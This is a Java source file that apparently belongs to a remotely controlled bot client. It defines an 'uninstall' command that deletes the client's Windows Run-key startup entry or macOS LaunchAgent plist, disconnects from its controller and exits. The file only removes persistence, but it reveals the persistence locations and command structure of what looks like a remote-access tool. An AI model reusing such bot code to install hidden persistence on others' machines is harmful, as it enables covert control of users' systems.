package commands;

import java.io.File;

import bot.Main;
import bot.Util;
import bot.WinRegistry;

import com.redpois0n.oslib.OperatingSystem;

public class CommandUninstall extends Command {

	/**
	 * Uninstalls and exits
	 */
	@Override
	public void perform() throws Exception {
		try {
			if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
				WinRegistry.deleteValue(WinRegistry.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Main.getStartupName());
			} else if (OperatingSystem.getOperatingSystem() == OperatingSystem.OSX) {
				new File(System.getProperty("user.home") + "/Library/LaunchAgents/" + Util.getJarFile().getName().replace(".jar", ".plist")).delete();
			}
		} catch (Exception ex) {
			ex.printStackTrace();
		}
		try {

			Main.disconnect();
		} catch (Exception ex) {
		}
		System.exit(0);
	}

}
